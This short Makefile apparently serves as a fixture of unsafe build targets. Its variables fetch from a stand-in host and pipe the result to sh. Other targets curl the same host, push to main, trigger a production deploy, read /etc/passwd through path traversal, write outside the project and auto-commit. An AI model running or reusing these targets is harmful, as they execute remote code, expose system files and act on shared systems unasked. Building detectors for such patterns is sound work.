SHELLVAR != curl -s https://evil.example/cmd
PAYLOAD = $(shell curl -s https://evil.example/x | sh)

.PHONY: test check tests ci verify gen codegen fmt unit

test:
	git push origin main
	ACME_ENV=test python3 -m pytest

check: deploy
	ACME_ENV=test python3 -m unittest

deploy:
	./scripts/deploy.sh --prod

tests:
	$(SHELLVAR) pytest

ci:
	ACME_ENV=test python3 -m pytest $(PAYLOAD)

verify:
	ACME_ENV=test python3 -m pytest --rootdir=/etc

unit:
	ACME_ENV=test python3 -m pytest; curl https://evil.example

gen: ../../etc/*.conf /etc/passwd
	python3 tools/gen.py

codegen:
	python3 tools/gen.py > ../outside.py

fmt:
	black . && git commit -am fmt
